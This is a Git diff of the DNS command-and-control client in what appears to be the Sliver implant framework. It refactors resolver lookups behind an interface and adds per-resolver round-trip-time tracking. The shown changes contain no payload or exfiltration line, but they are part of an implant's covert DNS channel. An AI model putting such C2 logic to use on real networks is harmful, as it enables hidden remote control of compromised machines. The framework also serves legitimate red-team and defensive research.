@@ -52,10 +52,8 @@ fallback to Base32 if we detect problems.
 // {{if .Config.DNSc2Enabled}}
 
 import (
-	"context"
 	"encoding/binary"
 	"errors"
-	"net"
 	"strconv"
 	"strings"
 	"time"
@@ -76,11 +74,14 @@ const (
 	// Little endian
 	sessionIDBitMask = 0x00ffffff // Bitwise mask to get the dns session ID
 	messageIDBitMask = 0xff000000 // Bitwise mask to get the message ID
+
+	metricsMaxSize = 64
 )
 
 var (
 	errMsgTooLong          = errors.New("{{if .Config.Debug}}Too much data to encode{{end}}")
 	errInvalidDNSSessionID = errors.New("{{if .Config.Debug}}Invalid dns session id{{end}}")
+	errNoResolvers         = errors.New("{{if .Config.Debug}}No resolvers found{{end}}")
 	ErrTimeout             = errors.New("{{if .Config.Debug}}DNS Timeout{{end}}")
 )
 
@@ -90,7 +91,8 @@ func DNSStartSession(parent string, retry time.Duration, timeout time.Duration) 
 	log.Printf("DNS client connecting to '%s' (timeout: %s) ...", parent, timeout)
 	// {{end}}
 	client := &SliverDNSClient{
-		resolver:      &net.Resolver{PreferGo: false},
+		metrics: map[string][]time.Duration{},
+
 		parent:        "." + strings.TrimPrefix(parent, "."),
 		caseSensitive: false, // Can we use a case sensitive encoding?
 		forceBase32:   false, // Force case insensitive encoding
@@ -111,8 +113,10 @@ func DNSStartSession(parent string, retry time.Duration, timeout time.Duration) 
 
 // SliverDNSClient - The DNS client context
 type SliverDNSClient struct {
-	resolver   *net.Resolver
+	resolver   SystemResolver
 	resolvConf *dns.ClientConfig
+	primary    int
+	metrics    map[string][]time.Duration
 
 	parent        string
 	retry         time.Duration
@@ -129,10 +133,12 @@ type SliverDNSClient struct {
 
 // SessionInit - Initialize DNS session
 func (s *SliverDNSClient) SessionInit() error {
-
 	err := s.loadResolvConf()
 	if err != nil {
 		return err
+	}
+	if len(s.resolvConf.Servers) == 0 {
+		return errNoResolvers
 	}
 
 	// {{if .Config.Debug}}
@@ -150,10 +156,11 @@ func (s *SliverDNSClient) SessionInit() error {
 	// {{if .Config.Debug}}
 	log.Printf("[dns] Fetching dns session id via '%s' ...", otpDomain)
 	// {{end}}
-	a, err := s.a(otpDomain)
+	a, rtt, err := s.resolver.A(otpDomain)
 	if err != nil {
 		return err
 	}
+	s.recordMetrics(s.resolver.Address(), rtt)
 	if len(a) < 1 {
 		return errInvalidDNSSessionID
 	}
@@ -167,6 +174,10 @@ func (s *SliverDNSClient) SessionInit() error {
 	// {{end}}
 
 	return nil
+}
+
+func (s *SliverDNSClient) primaryResolver() string {
+	return s.resolvConf.Servers[s.primary] + ":" + s.resolvConf.Port
 }
 
 func (s *SliverDNSClient) loadResolvConf() error {
@@ -223,108 +234,29 @@ func (s *SliverDNSClient) fingerprintResolver() {
 
 }
 
-// Query methods - Currently supports TXT, A, and CNAME
-func (s *SliverDNSClient) txt(domain string) (string, error) {
-	// {{if .Config.Debug}}
-	started := time.Now()
-	log.Printf("[dns] txt lookup -> %s", domain)
-	// {{end}}
-
-	var txts []string
-	var err error
-	for retryCount := 0; retryCount < s.retryCount; retryCount++ {
-		txts, err = net.LookupTXT(domain)
-		if err != nil || len(txts) == 0 {
-			// {{if .Config.Debug}}
-			log.Printf("[!] dns failure: %s -> %s", err, domain)
-			log.Printf("[!] retry sleep: %s", s.retry)
-			// {{end}}
-			time.Sleep(s.retry)
-		} else {
-			break
-		}
+func (s *SliverDNSClient) recordMetrics(resolver string, rtt time.Duration) {
+	if s.metrics == nil {
+		s.metrics = make(map[string][]time.Duration)
 	}
-	if err != nil || len(txts) == 0 {
-		return "", err
+	if _, ok := s.metrics[resolver]; !ok {
+		s.metrics[resolver] = []time.Duration{}
+	}
+	if len(s.metrics[resolver]) < metricsMaxSize {
+		s.metrics[resolver] = append([]time.Duration{rtt}, s.metrics[resolver]...)
 	} else {
-		// {{if .Config.Debug}}
-		log.Printf("[dns] query took %s", time.Since(started))
-		// {{end}}
-		return strings.Join(txts, ""), nil
+		s.metrics[resolver] = append([]time.Duration{rtt}, s.metrics[resolver][:metricsMaxSize-1]...)
 	}
 }
 
-func (s *SliverDNSClient) a(domain string) ([][]byte, error) {
-	// {{if .Config.Debug}}
-	started := time.Now()
-	log.Printf("[dns] a lookup -> %s", domain)
-	log.Printf("[dns] resolver: %v", s.resolver)
-	// {{end}}
-
-	var ips []net.IPAddr
-	var err error
-	for retryCount := 0; retryCount < s.retryCount; retryCount++ {
-
-		// {{if .Config.Debug}}
-		queryStarted := time.Now()
-		// {{end}}
-		ips, err = s.resolver.LookupIPAddr(context.Background(), domain)
-		// {{if .Config.Debug}}
-		log.Printf("[dns] query took %s", time.Since(queryStarted))
-		// {{end}}
-
-		if err != nil || len(ips) == 0 {
-			// {{if .Config.Debug}}
-			log.Printf("[!] dns failure: %s -> %s", err, domain)
-			log.Printf("[!] retry sleep: %s", s.retry)
-			// {{end}}
-			time.Sleep(s.retry)
-		} else {
-			break
-		}
+func (s *SliverDNSClient) averageRtt(resolver string) time.Duration {
+	if _, ok := s.metrics[resolver]; !ok || len(s.metrics[resolver]) < 1 {
+		return time.Duration(0)
 	}
-	if err != nil || len(ips) == 0 {
-		return nil, err
-	} else {
-		rawIPs := make([][]byte, 0)
-		for _, ip := range ips {
-			rawIPs = append(rawIPs, ip.IP.To4())
-		}
-		// {{if .Config.Debug}}
-		log.Printf("[dns] lookup took %s", time.Since(started))
-		// {{end}}
-		return rawIPs, nil
+	var sum time.Duration
+	for _, rtt := range s.metrics[resolver] {
+		sum += rtt
 	}
-}
-
-func (s *SliverDNSClient) cname(domain string) (string, error) {
-	// {{if .Config.Debug}}
-	started := time.Now()
-	log.Printf("[dns] cname lookup -> %s", domain)
-	// {{end}}
-
-	var cname string
-	var err error
-	for retryCount := 0; retryCount < s.retryCount; retryCount++ {
-		cname, err = net.LookupCNAME(domain)
-		if err != nil || len(cname) == 0 {
-			// {{if .Config.Debug}}
-			log.Printf("[!] dns failure -> %s", domain)
-			log.Printf("[!] retry sleep: %s", s.retry)
-			// {{end}}
-			time.Sleep(s.retry)
-		} else {
-			break
-		}
-	}
-	if err != nil || len(cname) == 0 {
-		return "", err
-	} else {
-		// {{if .Config.Debug}}
-		log.Printf("[dns] query took %s", time.Since(started))
-		// {{end}}
-		return cname, nil
-	}
+	return sum / time.Duration(len(s.metrics[resolver]))
 }
 
 // {{end}} -DNSc2Enabled
